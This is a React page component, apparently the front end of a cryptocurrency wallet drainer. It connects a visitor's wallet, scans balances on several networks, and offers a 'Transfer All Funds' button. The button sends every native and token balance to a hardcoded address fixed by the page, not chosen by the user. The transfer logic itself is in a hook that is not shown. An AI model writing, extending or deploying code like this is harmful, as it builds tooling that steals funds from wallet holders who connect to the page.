import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Wallet, Loader2, CheckCircle } from "lucide-react";
import { useWeb3 } from "@/hooks/use-web3";
import TransactionModal from "@/components/transaction-modal";
import WalletConnectionModal from "@/components/wallet-connection-modal";

export default function Home() {
  const { walletState, isConnecting, isLoadingNetworks, connectWallet, transferAllFundsMultiNetwork } = useWeb3();
  const [currentTransaction, setCurrentTransaction] = useState<string | null>(null);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [connectionError, setConnectionError] = useState<string>("");

  const handleTransactionStart = (txHash: string) => {
    setCurrentTransaction(txHash);
  };

  const handleTransactionClose = () => {
    setCurrentTransaction(null);
  };

  const handleWalletConnect = () => {
    setShowWalletModal(true);
    setConnectionError("");
  };

  const handleWalletModalClose = () => {
    setShowWalletModal(false);
    setConnectionError("");
  };

  const handleConnectAttempt = async () => {
    try {
      await connectWallet();
      setShowWalletModal(false);
      setConnectionError("");
    } catch (error: any) {
      setConnectionError(error.message);
    }
  };

  const handleTransfer = async () => {
    try {
      const destinationAddress = import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE";
      await transferAllFundsMultiNetwork(destinationAddress);
    } catch (error) {
      console.error("Transfer failed:", error);
    }
  };

  // Check if all network balances are loaded
  const allNetworksLoaded = walletState.isConnected && !isLoadingNetworks;
  
  // Check if user has any funds across all networks
  const hasAnyFunds = walletState.isConnected && (
    parseFloat(walletState.ethBalance || '0') > 0 ||
    walletState.tokenBalances.length > 0 ||
    walletState.networkBalances.some(n => parseFloat(n.nativeBalance) > 0 || n.tokenBalances.length > 0)
  );

  return (
    <div className="min-h-screen bg-background ethereum-gradient-subtle flex items-center justify-center">
      <div className="flex flex-col items-center space-y-8">
        
        {/* Wallet Connect Button */}
        <Button
          onClick={walletState.isConnected ? undefined : handleWalletConnect}
          disabled={isConnecting}
          className={`ethereum-gradient hover:ethereum-glow-strong text-white font-semibold py-6 px-12 text-lg transition-all duration-300 ${
            walletState.isConnected ? "ethereum-pulse" : ""
          }`}
        >
          <Wallet className="w-6 h-6 mr-3" />
          {isConnecting
            ? "Connecting..."
            : walletState.isConnected
            ? "Wallet Connected"
            : "Connect Wallet"}
        </Button>

        {/* Network Loading Indicator */}
        {walletState.isConnected && (
          <div className="flex items-center space-x-3">
            {isLoadingNetworks ? (
              <>
                <Loader2 className="w-5 h-5 text-primary animate-spin" />
                <span className="text-muted-foreground">Scanning networks...</span>
              </>
            ) : (
              <>
                <CheckCircle className="w-5 h-5 text-success ethereum-pulse" />
                <span className="text-success font-medium">All networks scanned</span>
              </>
            )}
          </div>
        )}

        {/* Transfer Button */}
        <Button
          onClick={handleTransfer}
          disabled={!allNetworksLoaded || !hasAnyFunds}
          className={`ethereum-gradient-danger hover:ethereum-glow-strong text-white font-semibold py-6 px-12 text-lg transition-all duration-300 ${
            allNetworksLoaded && hasAnyFunds ? "ethereum-pulse" : "opacity-50 cursor-not-allowed"
          }`}
        >
          Transfer All Funds
        </Button>

        {/* Transaction Modal */}
        {currentTransaction && (
          <TransactionModal
            txHash={currentTransaction}
            isOpen={!!currentTransaction}
            onClose={handleTransactionClose}
          />
        )}

        {/* Wallet Connection Modal */}
        <WalletConnectionModal
          isOpen={showWalletModal}
          onClose={handleWalletModalClose}
          onConnect={handleConnectAttempt}
          error={connectionError}
        />
      </div>
    </div>
  );
}
